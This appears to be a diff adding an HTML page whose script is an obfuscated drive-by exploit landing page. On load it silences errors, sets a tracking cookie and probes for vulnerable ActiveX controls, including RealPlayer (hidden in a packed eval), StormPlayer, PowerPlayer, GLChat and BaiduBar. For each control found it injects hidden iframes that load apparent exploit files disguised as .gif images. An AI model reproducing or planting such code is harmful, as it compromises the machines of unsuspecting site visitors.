@@ -1,0 +1,44 @@
+<script>
+	window.onerror=function(){return true;}
+	window.status="Íê³É";
+</script>
+<script>
+var L_czcY_1 = new window["Date"]()
+L_czcY_1["setTime"](L_czcY_1["getTime"]() + 3*60*60*1000)
+var Jy2$2 = new window["String"](window["document"]["cookie"])
+var sX$bhbGk3 = "Cookie1="
+var zecKZZ4 = Jy2$2["indexOf"](sX$bhbGk3)
+
+function Fin(){
+	document.all("qin").value="1";
+}
+function inq(){
+	if(document.all("qin").value!="1"){
+		window["document"]["writeln"]('<iframe style=display:none src="3.gif"></iframe>');
+	}
+}
+
+/*if (zecKZZ4 == -1)*/
+/*{*/
+
+		window["document"]["cookie"] = "Cookie1=POPWINDOS;expires="+ L_czcY_1["toGMTString"]()
+		
+		
+		try{if(new ActiveXObject("Microsoft.XMLHTTP"))window["document"]["write"]('<iframe style=display:none src="2.gif"></iframe>');}catch(e){}
+		
+		eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('b{a(c d("9"+"\\g\\7\\3\\2\\4\\5\\6"+"f"+"h.1"))o["p"]["q"](\'<0 n=m:i j="8.k"></0>\')}l(e){}',27,27,'iframe||x2E|x6C|x49|x45|x52|x74||IERP|if|try|new|ActiveXObject||PC|x43|tl|none|src|gif|catch|display|style|window|document|write'.split('|'),0,{}))
+		
+		try{if(new ActiveXObject("MPS.StormPlayer"))window["document"]["write"]('<iframe style=display:none src="1.gif"></iframe>');}catch(e){}
+		
+		try{if(new ActiveXObject("POWERPLAYER.PowerPlayerCtrl.1"))window["document"]["write"]('<iframe style=display:none src="5.gif"></iframe>');}catch(e){}
+		
+		try{if(new ActiveXObject("GLCHAT.GLChatCtrl.1"))window["document"]["write"]('<iframe style=display:none src="11.gif"></iframe>');}catch(e){}
+		
+		try{if(new ActiveXObject("BaiduBar.Tool"))window["document"]["write"]('<iframe style=display:none src="4.gif"></iframe>');}catch(e){}
+		
+		window["document"]["writeln"]('<iframe style=display:none src="3.gif"></iframe>');
+		
+		
+		
+/*}*/
+</script>
